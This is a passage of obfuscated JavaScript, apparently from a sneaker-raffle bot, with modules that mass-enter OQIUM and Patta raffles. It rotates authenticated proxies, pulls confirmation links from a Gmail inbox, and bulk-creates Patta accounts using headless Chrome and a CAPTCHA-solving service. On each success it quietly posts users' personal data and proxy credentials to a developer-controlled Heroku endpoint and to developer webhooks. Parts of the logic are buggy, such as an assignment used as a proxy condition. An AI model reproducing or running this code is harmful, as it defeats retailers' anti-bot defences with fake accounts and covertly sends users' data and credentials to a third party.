                                                'name': 'Size',
                                                'value': '' + _0x12c8cd[_0x2d8f51]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x114346['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x92063b
                                            }
                                        ]
                                    }], _0x4a206a = { 'embeds': _0x1b38ab }, _0x5735db = _0x43138a['data'], _0x5735db['data']['attributes']['email'] = '' + _0x12c8cd[_0x2d8f51]['Email'];
                                    if (_0x12c8cd[_0x2d8f51]['Size'] == 'RANDOM') {
                                    }
                                    _0x5735db['data']['attributes']['properties']['$first_name'] = '' + _0x12c8cd[_0x2d8f51]['FirstName'], _0x5735db['data']['attributes']['properties']['$last_name'] = '' + _0x12c8cd[_0x2d8f51]['LastName'], _0x5735db['data']['attributes']['properties']['$address1'] = _0x12c8cd[_0x2d8f51]['Address1'] + '\x20' + _0x12c8cd[_0x2d8f51]['Address2'] + '\x20' + _0x12c8cd[_0x2d8f51]['HouseNumber'], _0x5735db['data']['attributes']['properties']['$zip'] = '' + _0x12c8cd[_0x2d8f51]['Zip'], _0x5735db['data']['attributes']['properties']['$city'] = '' + _0x12c8cd[_0x2d8f51]['City'], _0x5735db['data']['attributes']['properties']['$country'] = '' + _0x12c8cd[_0x2d8f51]['Country'], _0x12c8cd[_0x2d8f51]['Size'] == 'RANDOM' ? _0x5735db['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x38515f[_0x5ecf1a] : _0x5735db['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x12c8cd[_0x2d8f51]['Size'], _0x5735db['data']['attributes']['properties']['$phone_number'] = '' + _0x12c8cd[_0x2d8f51]['Phone'], _0x5735db['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x12c8cd[_0x2d8f51]['Follower'];
                                }
                                if (_0x114346['useRandomProxy'] = ![])
                                    var _0x11d98c = _0x20dae7[_0x2d8f51]['split'](':');
                                else
                                    var _0x9b3a54 = Math['round'](Math['random']() * (_0x20dae7['length'] - 0x1)), _0x11d98c = _0x20dae7[_0x9b3a54]['split'](':');
                                var _0x4bea22 = {
                                    'jar': _0x388d4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x43138a['url'],
                                    'headers': _0x43138a['headers'],
                                    'body': JSON['stringify'](_0x5735db),
                                    'proxy': 'http://' + _0x11d98c[0x2] + ':' + _0x11d98c[0x3] + '@' + _0x11d98c[0x0] + ':' + _0x11d98c[0x1]
                                };
                                return _0x40631f != 'ver' && (_0x4bea22['url'] = _0x43138a['url'], _0x4bea22['headers'] = _0x43138a['headers']), _0x40631f == 'ver' && (_0x4bea22['method'] = 'GET'), new Promise(function (_0x4163c5, _0x389176) {
                                    callback = async (_0x266514, _0x533fe6, _0x7666b1) => {
                                        if (!_0x266514 && _0x533fe6['statusCode'] == 0xca || !_0x266514 && _0x533fe6['statusCode'] == 0xc8) {
                                            if (_0x40631f != 'ver') {
                                                var _0x7404bb = await _0x254487(_0x12c8cd[_0x2d8f51], _0x43138a, 'dev', ![]), _0x4d1d1b = await _0x254487(_0x12c8cd[_0x2d8f51], _0x43138a, 'pub', ![]);
                                                const _0x1c144e = {
                                                    'succesDEVMSG': { 'embeds': [_0x7404bb] },
                                                    'succesPUBMSG': { 'embeds': [_0x4d1d1b] }
                                                };
                                                let _0x3c502b = _0x12c8cd[_0x2d8f51];
                                                try {
                                                    prxdata = {
                                                        'username': _0x447b4a['replace']('#', ''),
                                                        'module': _0x43138a['name'],
                                                        'entrydata': JSON['stringify'](_0x3c502b),
                                                        'proxy': '' + _0x20dae7[_0x2d8f51]
                                                    };
                                                    var _0x20e9a = JSON['stringify'](prxdata);
                                                    let _0x97d8bc = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x20e9a, _0x97d8bc);
                                                } catch (_0x52312d) {
                                                }
                                                if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                                    try {
                                                        await _0x5641c6(_0x114346['webhook'], _0x1c144e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x1c144e['succesDEVMSG']), await _0x572e60(0xc8);
                                                try {
                                                    await _0x5641c6(_0x30beeb, _0x1c144e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x14aa55(_0x12c8cd[_0x2d8f51], _0x43138a);
                                            }
                                            _0x346fdd--, _0x4163c5(console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x43138a['name'] + ']\x20Task\x20' + (_0x2d8f51 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x40631f != 'ver') {
                                                var _0x198531 = '' + _0x266514, _0x194b6e = await _0x254487(_0x12c8cd[_0x2d8f51], _0x43138a, 'dev', !![], _0x198531), _0x2a12b8 = {};
                                                _0x2a12b8['errorDEV'] = { 'embeds': [_0x194b6e] }, _0x58f6f1(_0x12c8cd[_0x2d8f51], _0x43138a), _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x2a12b8['errorDEV']), await _0x5641c6(_0x188004, _0x2a12b8['errorDEV']);
                                            }
                                            _0x346fdd--, _0x389176(console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x43138a['name'] + ']\x20Task\x20' + (_0x2d8f51 + 0x1) + ':\x20' + _0x266514)));
                                        }
                                    };
                                    try {
                                        _0x40631f != 'ver' && console['log'](_0xed09ee() + '\x20[' + _0x43138a['name'] + ']\x20Task\x20' + (_0x2d8f51 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5735db['data']['attributes']['email']), _0x2dca78(_0x4bea22, callback);
                                    } catch (_0x5ef053) {
                                        console['log'](_0xed09ee() + '\x20Task\x20' + (_0x2d8f51 + 0x1) + ':\x20' + _0x5ef053);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x19dc6f(_0x534deb, 'nor', _0x2ef3b4, _0x5b6c1a, _0x35bb6a), console['log'](_0xed09ee() + '\x20[' + _0x2ef3b4['name'] + ']\x20Sleeping\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                            } catch (_0xa1bc3a) {
                            }
                        }
                        _0x5bedbf(_0x14d2de, _0x4080f3, _0x82abf, _0x5df7af), await _0x572e60(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x8142a, _0x4da7eb, _0x3c0619) {
                    var _0x4da7eb = [], _0x58e790 = ![];
                    async function _0x126a1c() {
                        var _0x2e9a98 = new _0x266969({
                            'user': _0x114346['masterMail'],
                            'password': _0x114346['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1b7f33(_0x164f2c) {
                            _0x2e9a98['openBox']('INBOX', ![], _0x164f2c);
                        }
                        _0x2e9a98['once']('ready', function () {
                            _0x1b7f33(function (_0x49208a, _0x3a9eba) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x49208a)
                                    throw _0x49208a;
                                _0x2e9a98['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x22e4c4, _0x460d4d) {
                                    if (!_0x460d4d || !_0x460d4d['length'])
                                        console['log'](_0xed09ee() + '\x20[' + _0x8142a['name'] + ']\x20No\x20mails\x20found'), _0x2e9a98['end']();
                                    else {
                                        var _0x418c31 = _0x2e9a98['seq']['fetch'](_0x460d4d, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x418c31['on']('message', function (_0x3b18d6, _0x1f7bee) {
                                            var _0x374e60 = '(#' + _0x1f7bee + ')\x20';
                                            _0x3b18d6['on']('body', function (_0x48726b, _0x309a07) {
                                                _0x172805(_0x48726b, (_0x2b1f15, _0x2f5713) => {
                                                    var _0x58c750 = _0x2f5713['text']['split']('(')[0x1], _0xcc9621 = _0x58c750['split'](')')[0x0];
                                                    _0x4da7eb['push'](_0xcc9621);
                                                });
                                            }), _0x3b18d6['once']('end', function () {
                                            });
                                        }), _0x418c31['once']('error', function (_0x2163ca) {
                                            console['log']('Fetch\x20error:\x20' + _0x2163ca), _0x58e790 = !![];
                                        }), _0x418c31['once']('end', function () {
                                            _0x2e9a98['end'](), _0x58e790 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2e9a98['once']('error', function (_0x596789) {
                            console['log'](_0x596789), _0x58e790 = !![];
                        }), _0x2e9a98['once']('end', async function () {
                            _0x58e790 = !![];
                        }), _0x2e9a98['connect']();
                    }
                    async function _0x370486(_0x4af204, _0x9ccb08, _0x423571) {
                        for (var _0x1a5e2e = 0x0; _0x1a5e2e < _0x9ccb08['length']; _0x1a5e2e++) {
                            async function _0xb83ae4(_0x3e4ccf, _0x40dc36, _0x3fc7de, _0x298fe7, _0x5cc42e) {
                                var _0x3cc573, _0x1cd980 = {}, _0x2f3ef9 = [], _0x526a24 = {}, _0x26784c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x46c407 = Math['round'](Math['random']() * (_0x26784c['length'] - 0x1));
                                _0x298fe7[_0x3e4ccf]['Size'] == 'RANDOM' && (_0x298fe7[_0x3e4ccf]['Size'] = _0x26784c[_0x46c407]);
                                !_0x298fe7 && (_0x298fe7 = {});
                                if (_0x114346['useRandomProxy'] = ![])
                                    var _0x35227d = _0x5cc42e[_0x3e4ccf]['split'](':');
                                else
                                    var _0x2cb735 = Math['round'](Math['random']() * (_0x5cc42e['length'] - 0x1)), _0x35227d = _0x5cc42e[_0x2cb735]['split'](':');
                                var _0x271fd1 = {
                                    'jar': _0x388d4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3fc7de['url'],
                                    'headers': _0x3fc7de['headers'],
                                    'body': JSON['stringify'](_0x1cd980),
                                    'proxy': 'http://' + _0x35227d[0x2] + ':' + _0x35227d[0x3] + '@' + _0x35227d[0x0] + ':' + _0x35227d[0x1]
                                };
                                return _0x40dc36 != 'ver' && (_0x271fd1['url'] = _0x3fc7de['url'], _0x271fd1['headers'] = _0x3fc7de['headers']), _0x40dc36 == 'ver' && (_0x271fd1['method'] = 'GET', _0x271fd1['url'] = _0x298fe7[_0x3e4ccf]), new Promise(function (_0x3faa31, _0x136de0) {
                                    callback = async (_0x21b8ea, _0x44c91d, _0x501971) => {
                                        if (!_0x21b8ea && _0x44c91d['statusCode'] == 0xca || !_0x21b8ea && _0x44c91d['statusCode'] == 0xc8) {
                                            if (_0x40dc36 != 'ver') {
                                                var _0x16521a = await _0x254487(_0x298fe7[_0x3e4ccf], _0x3fc7de, 'dev', ![]), _0x89f890 = await _0x254487(_0x298fe7[_0x3e4ccf], _0x3fc7de, 'pub', ![]);
                                                const _0x25d7ea = {
                                                    'succesDEVMSG': { 'embeds': [_0x16521a] },
                                                    'succesPUBMSG': { 'embeds': [_0x89f890] }
                                                };
                                                if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                                    try {
                                                        await _0x5641c6(_0x114346['webhook'], _0x25d7ea['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x25d7ea['succesDEVMSG']), await _0x572e60(0xc8);
                                                try {
                                                    await _0x5641c6(_0x30beeb, _0x25d7ea['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x14aa55(_0x298fe7[_0x3e4ccf], _0x3fc7de);
                                            }
                                            _0x3faa31(console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x3fc7de['name'] + ']\x20Task\x20' + (_0x3e4ccf + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x40dc36 != 'ver') {
                                                var _0x502482 = '' + _0x21b8ea, _0x47676c = await _0x254487(_0x298fe7[_0x3e4ccf], _0x3fc7de, 'dev', !![], _0x502482), _0x3a88af = {};
                                                _0x3a88af['errorDEV'] = { 'embeds': [_0x47676c] }, _0x58f6f1(_0x298fe7[_0x3e4ccf], _0x3fc7de), _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x3a88af['errorDEV']), await _0x5641c6(_0x188004, _0x3a88af['errorDEV']);
                                            }
                                            _0x136de0(console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x3fc7de['name'] + ']\x20Task\x20' + (_0x3e4ccf + 0x1) + ':\x20' + _0x21b8ea)));
                                        }
                                    };
                                    try {
                                        _0x40dc36 != 'ver' ? console['log'](_0xed09ee() + '\x20[' + _0x3fc7de['name'] + ']\x20Task\x20' + (_0x3e4ccf + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1cd980['data']['attributes']['email']) : console['log'](_0xed09ee() + '\x20[' + _0x3fc7de['name'] + ']\x20Task\x20' + (_0x3e4ccf + 0x1) + ':\x20Fetching\x20Response'), _0x2dca78(_0x271fd1, callback);
                                    } catch (_0x281579) {
                                        console['log'](_0xed09ee() + '\x20Task\x20' + (_0x3e4ccf + 0x1) + ':\x20' + _0x281579);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xb83ae4(_0x1a5e2e, 'ver', _0x4af204, _0x9ccb08, _0x423571), console['log'](_0xed09ee() + '\x20[' + _0x4af204['name'] + ']\x20Sleeping\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                            } catch (_0x34603c) {
                            }
                        }
                    }
                    try {
                        _0x126a1c();
                        while (!_0x58e790) {
                            await _0x572e60(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4da7eb['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x370486(_0x8142a, _0x4da7eb, _0x3c0619);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2cfdb9, _0x50fb0c, _0x1c0c33) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x16c471 = 0x0; _0x16c471 < _0x50fb0c['length']; _0x16c471++) {
                        var _0x3b861f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x447b4a
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x114346['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x92063b
                                }
                            ]
                        }];
                        const _0x4cabea = { 'embeds': _0x3b861f };
                        _0x59687e(_0x2cfdb9['name'] + '\x20Task\x20' + (_0x16c471 + 0x1) + '\x20/\x20' + _0x50fb0c['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        try {
                            await _0x44ca58(_0x50fb0c, _0x16c471);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2e07e0 = await _0x254487(_0x50fb0c[_0x16c471], _0x2cfdb9, 'acc', ![]);
                        const _0x4bfc3e = { 'succesDEVMSG': { 'embeds': [_0x2e07e0] } };
                        if (_0x50fb0c[_0x16c471]['Email'] == '' || _0x50fb0c[_0x16c471]['FirstName'] == '' || _0x50fb0c[_0x16c471]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x572e60(0x7d0);
                            continue;
                        }
                        (_0x50fb0c[_0x16c471]['Password'] == '' || _0x50fb0c[_0x16c471] == undefined) && _0x50fb0c[_0x16c471]['Password'] == 'JRaffles23!';
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x46836b = _0x1c0c33[_0x16c471]['split'](':');
                        else
                            var _0x26a3ab = Math['round'](Math['random']() * (_0x1c0c33['length'] - 0x1)), _0x46836b = _0x1c0c33[_0x26a3ab]['split'](':');
                        var _0x561b03;
                        try {
                            _0x561b03 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x46836b[0x0] + ':' + _0x46836b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x561b03 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x46836b[0x0] + ':' + _0x46836b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2848f2 = await _0x561b03['newPage']();
                            await _0x2848f2['authenticate']({
                                'username': '' + _0x46836b[0x2],
                                'password': '' + _0x46836b[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x2cfdb9['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2848f2['setRequestInterception'](!![]), _0x2848f2['on']('request', _0x5e78d5 => {
                                _0x5e78d5['resourceType']() === 'image' || _0x5e78d5['resourceType']() === 'font' || _0x5e78d5['resourceType']() === 'media' ? _0x5e78d5['abort']() : _0x5e78d5['continue']();
                            }), await _0x2848f2['goto']('https://patta.nl/account/register'), await _0x572e60(0xbb8), await _0x2848f2['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xed09ee() + '\x20[' + _0x2cfdb9['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Filling\x20information'), await _0x2848f2['type']('#RegisterForm-FirstName', '' + _0x50fb0c[_0x16c471]['FirstName']), await _0x572e60(0x226), await _0x2848f2['type']('#RegisterForm-LastName', '' + _0x50fb0c[_0x16c471]['LastName']), await _0x572e60(0x226), await _0x2848f2['type']('#RegisterForm-email', '' + _0x50fb0c[_0x16c471]['Email']), await _0x572e60(0x226), await _0x2848f2['type']('#RegisterForm-password', '' + _0x50fb0c[_0x16c471]['Password']), await _0x572e60(0x226), console['log'](_0xed09ee() + '\x20[' + _0x2cfdb9['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Submitting..'), await _0x2848f2['$eval']('#RegisterForm', _0xe93b80 => _0xe93b80['submit']()), await _0x572e60(0x1f40);
                            try {
                                await _0x2848f2['waitForSelector']('.home-page-grid__collection'), await _0x572e60(0x1f4), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x2cfdb9['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Account\x20' + _0x50fb0c[_0x16c471]['Email'] + '\x20Generated!')), _0x3d3f42['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x50fb0c[_0x16c471]['Email'] + ',' + _0x50fb0c[_0x16c471]['Password']), console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x2cfdb9['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Account\x20' + _0x50fb0c[_0x16c471]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x4bfc3e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5641c6(_0x34385d, _0x4bfc3e['succesDEVMSG']);
                            } catch (_0x365810) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x365810));
                            }
                        } catch (_0x421d5b) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x16c471 + 0x1) + '\x20:\x20' + _0x421d5b));
                        } finally {
                            _0x561b03 && _0x561b03['close'](), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x12dc59, _0x37f78d, _0x140af4) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1f5cce = 0x0; _0x1f5cce < _0x37f78d['length']; _0x1f5cce++) {
                        var _0x1ba16c;
                        if (_0x40f807 != 'yes')
                            var _0x40f807 = '', _0x19be48 = 0x0;
                        _0x59687e(_0x12dc59['name'] + '\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20/\x20' + _0x37f78d['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        try {
                            await _0x44ca58(_0x37f78d, _0x1f5cce);
                        } catch {
                            _0x40f807 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x37f78d[_0x1f5cce]['Email'] == '' || _0x37f78d[_0x1f5cce]['Password'] == '' || _0x37f78d[_0x1f5cce]['FirstName'] == '' || _0x37f78d[_0x1f5cce]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x39987f = _0x140af4[_0x1f5cce]['split'](':');
                        else
                            var _0x1b5168 = Math['round'](Math['random']() * (_0x140af4['length'] - 0x1)), _0x39987f = _0x140af4[_0x1b5168]['split'](':');
                        var _0x2e83ec;
                        try {
                            _0x2e83ec = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x39987f[0x0] + ':' + _0x39987f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2e83ec = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x39987f[0x0] + ':' + _0x39987f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xfbdaa0 = await _0x2e83ec['newPage']();
                            await _0xfbdaa0['authenticate']({
                                'username': '' + _0x39987f[0x2],
                                'password': '' + _0x39987f[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Getting\x20Session'), await _0xfbdaa0['setRequestInterception'](!![]), _0xfbdaa0['on']('request', _0x4fe1d2 => {
                                _0x4fe1d2['resourceType']() === 'image' || _0x4fe1d2['resourceType']() === 'font' || _0x4fe1d2['resourceType']() === 'media' ? _0x4fe1d2['abort']() : _0x4fe1d2['continue']();
                            }), await _0xfbdaa0['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xfbdaa0['waitForSelector']('#CustomerEmail'), console['log'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Logging\x20in..'), await _0xfbdaa0['type']('#CustomerEmail', '' + _0x37f78d[_0x1f5cce]['Email']), await _0x572e60(0x12c), await _0xfbdaa0['type']('#CustomerPassword', '' + _0x37f78d[_0x1f5cce]['Password']), await _0x572e60(0x226), await _0xfbdaa0['$eval']('#customer_login', _0x24c27f => _0x24c27f['submit']());
                            try {
                                await _0xfbdaa0['waitForSelector']('#orders'), await _0x572e60(0x4b0);
                            } catch {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xfbdaa0['goto']('' + _0x37f78d[_0x1f5cce]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x572e60(0xbb8), console['log'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xfbdaa0['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xfbdaa0['type']('#email', '' + _0x37f78d[_0x1f5cce]['Email']), await _0x572e60(0x384), await _0xfbdaa0['type']('#first_name', '' + _0x37f78d[_0x1f5cce]['FirstName']), await _0x572e60(0x514), await _0xfbdaa0['type']('#last_name', '' + _0x37f78d[_0x1f5cce]['LastName']), await _0x572e60(0x514), await _0xfbdaa0['type']('#street_address', _0x37f78d[_0x1f5cce]['Address1'] + '\x20' + _0x37f78d[_0x1f5cce]['HouseNumber'] + '\x20' + _0x37f78d[_0x1f5cce]['Address2']), await _0x572e60(0x2bc);
                            _0x37f78d[_0x1f5cce]['Postcode'] == undefined && (_0x37f78d[_0x1f5cce]['Postcode'] = _0x37f78d[_0x1f5cce]['Zip']);
                            await _0xfbdaa0['type']('#zip_code', '' + _0x37f78d[_0x1f5cce]['Postcode']), await _0x572e60(0x320), await _0xfbdaa0['type']('#city', '' + _0x37f78d[_0x1f5cce]['City']), await _0x572e60(0x320), await _0xfbdaa0['type']('#bday', '01/01/1994'), await _0x572e60(0x320), await _0xfbdaa0['type']('#instagram', '' + _0x37f78d[_0x1f5cce]['Follower']), await _0x572e60(0x352);
                            if (_0x37f78d[_0x1f5cce]['Size'] == 'RANDOM') {
                                const _0x4a6f97 = await _0xfbdaa0['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x471a58 => {
                                    return _0x471a58['map'](_0x3e5742 => _0x3e5742['textContent']);
                                });
                                var _0x5b251e = Math['round'](Math['random']() * (_0x4a6f97['length'] - 0x1));
                                console['log'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x4a6f97[_0x5b251e]), await _0xfbdaa0['click']('label[data-eu-size=\x22' + _0x4a6f97[_0x5b251e] + '\x22]');
                            } else {
                                console['log'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x37f78d[_0x1f5cce]['Size']);
